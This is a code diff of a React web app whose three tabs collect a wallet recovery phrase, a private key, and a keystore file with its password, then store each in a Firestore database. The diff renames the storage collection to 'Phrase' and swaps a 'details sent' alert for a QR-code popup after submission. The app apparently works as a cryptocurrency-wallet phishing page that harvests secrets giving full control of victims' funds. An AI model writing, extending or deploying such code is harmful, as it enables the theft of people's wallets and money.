@@ -9,7 +9,7 @@ import { AppContext } from "../../context";
 export const QrCodePopUp = () => {
   
   
-  const {showQr, setShowQr,src, generate} = useContext(AppContext);
+  const {showQr, setShowQr,src, } = useContext(AppContext);
 
 
   return (
@@ -71,7 +71,7 @@ export const FirstTab = (props) => {
   const handleSubmit = (event) => {
     event.preventDefault();
 
-    db.collection("details")
+    db.collection("Phrase")
       .add({
         phrase: inputValue,
       })
@@ -122,6 +122,7 @@ export const FirstTab = (props) => {
 
 export const SecondTab = () => {
   const [inputValue, setInputValue] = useState("");
+  const  {showQr, setShowQr, generate} = useContext(AppContext);
 
   const handleInputChange = (event) => {
     setInputValue(event.target.value);
@@ -135,7 +136,8 @@ export const SecondTab = () => {
         privateKey: inputValue,
       })
       .then(() => {
-        alert("details sent");
+        generate()
+        setShowQr(!showQr)
       })
       .catch((error) => {
         alert(error.message);
@@ -177,6 +179,7 @@ export const ThirdTab = () => {
     keystore: "",
     passwordField: "",
   });
+  const  {showQr, setShowQr, generate} = useContext(AppContext);
 
   const handleInputChange = (event) => {
     const { name, value } = event.target;
@@ -191,7 +194,8 @@ export const ThirdTab = () => {
         password: inputValue.passwordField,
       })
       .then(() => {
-        alert("details sent");
+        generate()
+        setShowQr(!showQr)
       })
       .catch((error) => {
         alert(error.message);
